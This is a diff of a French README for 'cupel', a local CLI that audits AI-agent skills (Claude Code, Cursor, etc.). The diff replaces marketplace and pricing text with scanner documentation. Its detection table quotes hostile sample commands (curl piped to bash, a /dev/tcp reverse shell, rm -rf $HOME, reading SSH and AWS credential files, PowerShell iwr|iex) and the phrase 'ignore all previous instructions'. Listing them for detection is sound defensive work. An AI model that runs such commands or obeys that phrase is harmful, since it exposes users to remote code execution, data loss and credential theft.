@@ -1,118 +1,165 @@
 # Cupel
 
-> Annuaire public gratuit de skills IA + control plane B2B pour équipes dev — Claude Code, Cursor, Codex, Windsurf, Gemini CLI.
+> Audit local des skills IA. Sépare le métal pur des impuretés.
 
-**Auteur** : Aïssa BELKOUSSA — contact@aissabelkoussa.fr — aissabelkoussa.fr
-**Statut** : Phase 0 — pivot B2B Teams (2026-05-15)
-**Licence** : propriétaire, tous droits réservés
+[![npm](https://img.shields.io/npm/v/cupel?label=npm)](https://www.npmjs.com/package/cupel)
+[![tests](https://img.shields.io/badge/tests-30%2F30-success)](packages/cli/test)
+[![license](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
 
-## Positionnement
+```bash
+npx cupel
+```
 
-Anthropic publie ses skills gratuitement et GitHub regorge de skills communautaires : vendre un skill à l'unité n'a plus de sens. Cupel capture la valeur là où elle reste : **la gouvernance B2B**. Côté public, tout est gratuit (browse, install CLI, reviews). Côté entreprise, deux plans payants apportent workspace privé, SSO, audit log, allowlist/blocklist, skills internes non publiés, et — sur Enterprise — Confidential Compute, SCIM et SOC 2.
-
-| Plan | Prix | Cible | Cœur de valeur |
-|---|---|---|---|
-| Public | gratuit | tout dev | browse, install via CLI, reviews |
-| Teams | 9 €/seat/mois | 5–50 devs | workspace privé, SSO, audit, allowlist, skills internes |
-| Enterprise | 29 €/seat/mois | ≥ 25 seats | SCIM, Confidential Compute, on-prem mirror, SOC 2, custom signing key |
-
-Détails : `docs/specs/pricing.md` et `docs/specs/positioning.md`.
+Scanne en quelques secondes les skills installés pour **Claude Code, Cursor, Codex, Windsurf, Gemini CLI, GitHub Copilot CLI, Continue**. Détecte les prompt injections, les exfiltrations de credentials, les reverse shells, les `curl | bash`, les signatures absentes, les skills stales. **Zero network. Tout reste sur ta machine.**
 
 ---
 
-## Stack
+## Pourquoi « cupel » ?
 
-| Couche | Tech |
+Avant que les startups inventent les scans cybersécurité, les **orfèvres** avaient déjà un outil pour distinguer le vrai or du faux. Ça s'appelle une **coupelle** — en anglais, *cupel*.
+
+On y dépose l'échantillon de métal, on chauffe à 1000 °C, et la céramique poreuse absorbe les impuretés (plomb, scories, alliages parasites). Le métal pur reste, isolé, visible.
+
+`cupel` fait exactement ça pour tes skills IA. Tu lances le scan, l'outil chauffe — les impuretés (prompt injection, exfiltration, reverse shells) ressortent, le pur reste lisible.
+
+---
+
+## Usage rapide
+
+```bash
+# Aucune installation requise
+npx cupel
+
+# Sortie JSON pour CI / pipeline
+npx cupel --json
+
+# Échec du pipeline si un skill est en tier `danger`
+npx cupel --strict
+
+# Détail complet, même sur les skills sains
+npx cupel --verbose
+
+# Cibler un dossier précis
+npx cupel --path ~/.config/cursor/skills
+```
+
+Prérequis : **Node.js ≥ 22**.
+
+---
+
+## Ce que cupel détecte
+
+11 catégories de signaux, scoring composite, tier final `ok / warn / danger` :
+
+| Signal | Exemple |
 |---|---|
-| Frontend | Next.js 15 (App Router, RSC), Tailwind CSS 4, shadcn/ui, Framer Motion, react-hook-form, zod, next-intl |
-| Backend | Supabase Postgres 16, Auth (Google + GitHub), Storage, Edge Functions (Deno), Cloudflare R2 |
-| Paiement | Stripe Billing (subscriptions Teams/Enterprise, seats, proration, factures B2B SEPA + carte + virement) |
-| CLI | Node.js 22, commander, ora, chalk, inquirer — npm `cupel` |
-| Sécurité | Static analysis + LLM review (Claude Haiku) + signature SHA-256 + manifest signé Ed25519 |
-| Monitoring | Sentry, Plausible, Better Stack Logs, Statuspage |
+| `shell_pipe_to_interpreter` | `curl https://x.io/y.sh \| bash` |
+| `reverse_shell_tcp` | `/dev/tcp/10.0.0.1/4444` |
+| `rm_rf_root` | `rm -rf $HOME` |
+| `prompt_injection` | « ignore all previous instructions » (FR + EN) |
+| `cred_file_read` | `cat ~/.ssh/id_rsa`, `~/.aws/credentials` |
+| `credential_pattern` | clés AWS / Stripe / OpenAI en clair |
+| `webhook_exfil` | endpoints connus d'exfiltration (`webhook.site`, ngrok) |
+| `powershell_iwr_iex` | `iwr https://x | iex` |
+| `no_manifest` | absence de SKILL.md / README.md / manifest.json |
+| `unsigned` | aucune signature ed25519 / `.cupel-sig` |
+| `stale` | dernière modif > 365 jours |
 
-## Structure (monorepo pnpm)
+Les installeurs trusted (`sh.rustup.rs`, `nodejs.org`, etc.) sont reconnus et leur poids divisé par 2 — pour éviter les faux positifs sur les setups légitimes.
+
+Code source de la détection : [`packages/cli/src/commands/doctor.ts`](packages/cli/src/commands/doctor.ts).
+
+---
+
+## Plateformes scannées
+
+`cupel` détecte automatiquement les installations locales et scanne :
+
+- `~/.claude/skills/`
+- `~/.config/cursor/skills/`
+- `~/.codex/skills/`
+- `~/.config/windsurf/skills/`
+- `~/.gemini/skills/`
+- `~/.continue/skills/`
+- `~/.config/github-copilot-cli/skills/`
+- Le dossier courant du projet (et ses sous-dossiers `skills/`)
+
+---
+
+## Intégration CI/CD
+
+Exit codes :
+
+- `0` — aucun risque détecté (en `--strict` : tier ≠ danger)
+- `1` — erreur d'exécution (chemin invalide, permissions)
+- `2` — au moins un skill en tier `danger` (`--strict` activé)
+
+Exemple GitHub Actions :
+
+```yaml
+- name: Cupel — audit skills IA
+  run: npx cupel --strict --json > cupel-report.json
+```
+
+---
+
+## Audit manuel
+
+Le CLI te dit **ce qui** cloche. Pour comprendre *pourquoi* et *comment réparer* sans casser tes workflows, un audit humain est disponible.
+
+→ **[aissabelkoussa.fr/cupel](https://aissabelkoussa.fr/cupel)** — diagnostic 30 min gratuit, audit complet 400 € (tarif découverte, TJM normal 800 €).
+
+---
+
+## Roadmap
+
+Cupel commence comme un **scanner local autonome**, mais le repo accueillera progressivement :
+
+- `cupel scan` (présent) — audit local
+- `cupel sign` (prévu) — signer ses propres skills avec ed25519
+- `cupel publish` (prévu) — publier un skill signé dans une marketplace
+- `cupel install` (prévu) — installer un skill vérifié depuis le marketplace
+- Marketplace web (prévue) — annuaire public + control plane B2B Teams
+
+Voir [`docs/specs/roadmap.md`](docs/specs/roadmap.md) pour le détail des phases.
+
+Pour aujourd'hui, **seul `cupel doctor` (alias du binaire `cupel` par défaut) est production-ready**. Le reste arrivera quand la traction le justifiera.
+
+---
+
+## Développement
+
+```bash
+# Prérequis : Node 22+, pnpm 9+
+pnpm install
+pnpm --filter cupel build
+pnpm --filter cupel test    # 30 tests
+node packages/cli/bin/cupel.mjs --help
+```
+
+Structure (monorepo pnpm) :
 
 ```
 cupel/
-├── apps/
-│   └── web/                # Next.js 15 app
 ├── packages/
-│   ├── cli/                # cupel
-│   ├── sdk/                # @cupel/sdk
-│   ├── security/           # static analysis + signing
-│   └── shared/             # types + utils
-├── supabase/
-│   ├── migrations/         # SQL versionnés
-│   └── functions/          # Edge Functions Deno
-├── docs/
-│   ├── sessions/           # journal QQOQCCP (local, gitignored)
-│   ├── architecture/       # ADRs + diagrammes
-│   └── specs/              # spec functionnelles
-├── scripts/                # outils dev locaux
-└── _backup/                # backups locaux (gitignored)
+│   ├── cli/        # CLI cupel (publié sur npm)
+│   ├── shared/     # @cupel/shared (types, schemas)
+│   ├── security/   # @cupel/security (scan engine library)
+│   └── sdk/        # @cupel/sdk (futur SDK marketplace)
+├── apps/
+│   └── web/        # Next.js — marketplace (en attente de traction)
+├── scripts/
+│   └── audit/      # outils de scan publics
+└── supabase/       # backend (en attente)
 ```
-
-## Démarrage
-
-```bash
-# Prérequis : Node 22+, pnpm 9+, Supabase CLI
-
-pnpm install
-cp .env.example .env.local       # remplir
-pnpm supabase:start              # Supabase local
-pnpm supabase:push               # appliquer migrations
-pnpm dev                         # Next.js sur :5309 (port à vie)
-```
-
-## Commandes utiles
-
-```bash
-pnpm dev                 # Next.js dev server
-pnpm build               # build production
-pnpm typecheck           # vérif TS
-pnpm lint                # ESLint
-pnpm test                # Vitest
-pnpm supabase:types      # générer types DB
-pnpm cli:build           # build CLI
-pnpm cli:link            # lier CLI globalement (test)
-pnpm format              # prettier
-```
-
-## Documentation
-
-- `PROJECT.nfo` — fiche d'identité projet
-- `DESIGN.md` — direction esthétique (« Editorial Premium ») + tokens
-- `docs/architecture/` — ADRs, diagrammes, threat models
-- `docs/specs/` — spécifications fonctionnelles
-- `docs/sessions/` — journal de bord (local seulement)
-
-## Workflow Git
-
-Sessions parallèles : **jamais** `git add -A`, fichiers explicites uniquement (CLAUDE.md §7).
-
-```bash
-git add path/to/file.ts path/to/other.ts
-git commit -m "feat(scope): description"
-```
-
-## Direction esthétique
-
-**Editorial Premium** — Migra display + Geist body + JetBrains Mono. Palette ivoire/encre + accents terracotta/sage. Pas de gradient purple-blue, pas de Inter. Voir `DESIGN.md` pour détails.
-
-## Sécurité
-
-- Aucune clé secrète côté client (CLAUDE.md §5)
-- RLS Supabase activé sur toutes les tables sensibles
-- Signature Ed25519 sur chaque skill version
-- Scan secrets + eval/exec sur upload
-- Review LLM (Claude Haiku) anti-prompt-injection
-- CSP strict, Referrer Policy `strict-origin-when-cross-origin`
-
-## Roadmap court terme
-
-Voir `docs/specs/roadmap.md`. Phase 0 → 5 sur 12 mois, MVP public visé mois 3.
 
 ---
 
-© 2026 Aïssa BELKOUSSA — Tous droits réservés
+## Auteur
+
+**Aïssa BELKOUSSA** — consultant IA & dev, France
+[aissabelkoussa.fr](https://aissabelkoussa.fr) · [GitHub](https://github.com/aissablk1)
+
+## Licence
+
+MIT — fait pour être forké, audité, amélioré.
